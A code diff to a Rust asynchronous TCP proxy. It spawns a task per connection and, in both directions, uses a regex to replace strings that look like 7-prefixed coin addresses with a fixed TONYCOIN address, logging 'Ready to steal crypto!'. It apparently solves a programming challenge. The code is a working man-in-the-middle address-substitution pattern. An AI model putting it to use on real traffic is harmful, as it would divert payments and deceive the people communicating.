@@ -28,11 +28,14 @@ async fn main() -> Result<()> {
     info!("Ready to steal crypto!");
 
     // Accept incoming connections
-    while let Ok((client, _)) = listener.accept().await {
-        info!("Establishing a connection to the upstream server.",);
-
-        // Spawn a task to handle each client
-        process(client).await?;
+    while let Ok((client, addr)) = listener.accept().await {
+        // Spawn our handler to be run asynchronously.
+        tokio::spawn(async move {
+            info!("accepted connection from {}", addr);
+            if let Err(e) = process(client).await {
+                error!("an error occurred; error = {:?}", e);
+            }
+        });
     }
 
     Ok(())
@@ -56,11 +59,8 @@ async fn process(client_stream: TcpStream) -> Result<()> {
         // [A-Za-z0-9]{26,35}: Matches 25 to 35 alphanumeric characters (A-Za-z0-9)
         // (?=\z| ): Matches either the end of the message (\z) or a space character ( ), lookahead assertion
         let re = Regex::new(r"(?<=\A| )7[A-Za-z0-9]{25,35}(?=\z| )").unwrap();
-
-        // let mut buf = [0; 1024];
-
+        let mut data = String::new();
         loop {
-            let mut data = String::new();
             let n = match client_reader.read_line(&mut data).await {
                 Ok(n) => n,
                 Err(e) => {
@@ -73,10 +73,6 @@ async fn process(client_stream: TcpStream) -> Result<()> {
                 break;
             }
 
-            // let data = String::from_utf8(buf[..n].to_vec()).unwrap();
-
-            // re.replace method takes two arguments:
-            // the original string and the string to replace the match with.
             // The method returns a new string with the matches replaced.
             let replaced = re.replace_all(&data, TONYCOIN);
 
@@ -89,12 +85,10 @@ async fn process(client_stream: TcpStream) -> Result<()> {
         }
     });
 
+    
     tokio::spawn(async move {
         let re = Regex::new(r"(?<=\A| )7[A-Za-z0-9]{25,35}(?=\z| )").unwrap();
-
-        // let mut buf = [0; 1024];
         let mut data = String::new();
-
         loop {
             let n = match server_reader.read_line(&mut data).await {
                 Ok(n) => n,
@@ -108,11 +102,6 @@ async fn process(client_stream: TcpStream) -> Result<()> {
                 break;
             }
 
-            // let data = String::from_utf8(buf[..n].to_vec()).unwrap();
-
-            // re.replace method takes two arguments:
-            // the original string and the string to replace the match with.
-            // The method returns a new string with the matches replaced.
             // If no match, the string is returned intact.
             let replaced = re.replace_all(&data, TONYCOIN);
 
